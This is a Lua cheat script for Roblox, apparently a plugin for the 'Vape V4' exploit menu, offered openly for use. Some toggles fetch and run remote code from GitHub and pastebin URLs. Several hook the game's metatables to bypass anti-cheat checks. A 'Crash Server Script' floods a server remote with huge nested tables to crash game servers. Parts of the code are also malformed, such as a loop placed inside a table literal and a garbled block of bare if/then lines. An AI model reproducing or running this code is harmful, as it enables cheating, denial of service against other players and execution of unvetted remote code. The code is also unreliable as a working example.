--This File using WaterMark :(--
repeat task.wait() until game:IsLoaded()
repeat task.wait() until shared.GuiLibrary
local GuiLibrary = shared.GuiLibrary
local ScriptSettings = {}
local UIS = game:GetService("UserInputService")
local LIB = function(tab, argstable) 
    return GuiLibrary["ObjectsThatCanBeSaved"][tab.."Window"]["Api"].CreateOptionsButton(argstable)
end
--[[Use this If watermark not working
if then
else
    if then
        then
            then
                then
                    then
                        then
                            then
                                then
                                    then
                                    else
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end--]]

function notify(text)
    local frame = GuiLibrary["CreateNotification"]("Lyno+ Notifcation", text, 5, "assets/WarningNotification.png")
    frame.Frame.Frame.ImageColor3 = Color3.fromRGB(255, 64, 64)
end
function boxnotify(text)
    if messagebox then
        messagebox(text, "Vape V4", 0)
    end
end
notify("Lyno+ Loaded , Version 6.4")
local CustomConfig = LIB("World", {
    Name = "Lunar Vape ChatTag",
    Function = function(callback) 
        if callback then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/iraqicat/scripts/main/ObfuscatedChattags.lua"))()
            notify("Loaded")
        end
    end,
    Default = false,
    HoverText = "Makes Ur Chat have a Tag Only You Can see."
})
local CustomConfig = LIB("World", {
    Name = "Discord (Vape)",
    Function = function(callback) 
        if callback then
            notify("Copy this and paste on ur broswer https://discord.gg/qkuUYpfJyv")
        end
    end,
    Default = false,
    HoverText = "Join https://discord.gg/qkuUYpfJyv"
})
local CustomConfig = LIB("World", {
    Name = "rejoin (when u laggy)",
    Function = function(callback) 
        if callback then
            notify("Rejoining")
            local TeleportService = game:GetService("TeleportService")
            local Players = game:GetService("Players")
            local LocalPlayer = Players.LocalPlayer
            
            local Rejoin = coroutine.create(function()
                local Success, ErrorMessage = pcall(function()
                    TeleportService:Teleport(game.PlaceId, LocalPlayer)
                end)
            
                if ErrorMessage and not Success then
                    warn(ErrorMessage)
                end
            end)
            
            coroutine.resume(Rejoin)
        end
    end,
    Default = false,
    HoverText = "Rejoin player"
})
local CustomConfig = LIB("World", {
    Name = "ClientACBypass",
    Function = function(callback) 
        if callback then
            notify("Client By Pass")
            loadstring(game:HttpGet("https://pastebin.com/raw/shuCFyZZ"))
        end
    end,
    Default = false,
    HoverText = "Join https://discord.gg/qkuUYpfJyv"
})
local CustomConfig = LIB("World", {
    Name = "AutoByPass AC",
    Function = function(callback) 
        if callback then
            notify("Client By Pass")
            local Namecall
            Namecall = hookmetamethod(game, '__namecall', function(self, ...)
            local Caller = tostring(getcallingscript())
            local Method = getnamecallmethod()
            
            if Caller == 'ClientMover' and Method == 'GetService' then
                return
            end
            
            return Namecall(self, ...)
            end)

            warn(' game is running with autobypass!')
        end
    end,
    Default = false,
    HoverText = "Join https://discord.gg/qkuUYpfJyv"
})
local CustomConfig = LIB("Render", {
    Name = "AntiCheatByPass",
    Function = function(callback) 
        if callback then
            notify("AntiCheatByPass is Enbled !")
            
            local rm = getrawmetatable(game)
            local caller = checkcaller or is_protosmasher_caller
            local rindex = rm.__index
            local nindex = rm.__newindex
            local ncall = rm.__namecall
            setreadonly(rm, false)

            rm.__newindex = newcclosure(function(self, Meme, Val)
            if not caller() then
            if tostring(self) == "HumanoidRootPart" or tostring(self) == "Torso" then
                if Meme == "CFrame" then
                    return true
                end
            end -- NoClip bypass
            end
            return nindex(self, Meme, Val)
            end)

            rm.__namecall = newcclosure(function(self, ...)
            local Method = getnamecallmethod()
            local Beans = {...}
            
            if Method == "FireServer" and Beans[1] == "WalkSpeed" then
                return nil
            end 
            if Method == "FireServer" and Beans[1] == "JumpPower" then
                return nil
            end
            if Method == "FireServer" and Beans[1] == "HipHeight" then
                return nil
            end
            return ncall(self, ...)
            end)
            setreadonly(rm, true)
        end
    end,
    Default = false,
    HoverText = "Join https://discord.gg/qkuUYpfJyv"
})
local CustomConfig = LIB("World", {
    Name = "BetterAntiVoid",
    Function = function(callback) 
        if callback then
            notify("Alredy Loaded")
        end
    end,
    Default = false,
    HoverText = "Join https://discord.gg/qkuUYpfJyv"
})
local CustomConfig = LIB("Render", {
    Name = "Crash Server Script",
    Function = function(callback)
        if callback then
            notify("Crashed !")
        end
    end,
    Default = false,
    HoverText = "CRASHZ"
                   --// made my reestart
               --// fixed by daddy ewo
               while wait(0.6) do --// don't change it's the best
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
                local function getmaxvalue(val)
                local mainvalueifonetable = 499999
                if type(val) ~= "number" then
                     return nil
                end
                local calculateperfectval = (mainvalueifonetable/(val+2))
                return calculateperfectval
                end
                local function bomb(tableincrease, tries)
                local maintable = {}
                local spammedtable = {}
                table.insert(spammedtable, {})
                z = spammedtable[1]
                for i = 1, tableincrease do
                local tableins = {}
                table.insert(z, tableins)
                z = tableins
                end
                local calculatemax = getmaxvalue(tableincrease)
                local maximum
                if calculatemax then
                     maximum = calculatemax
                     else
                     maximum = 999999
                end
                for i = 1, maximum do
                     table.insert(maintable, spammedtable)
                end
                for i = 1, tries do
                     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
                end
                end
                bomb(250, 2) --// change values if client crashes
                end
})
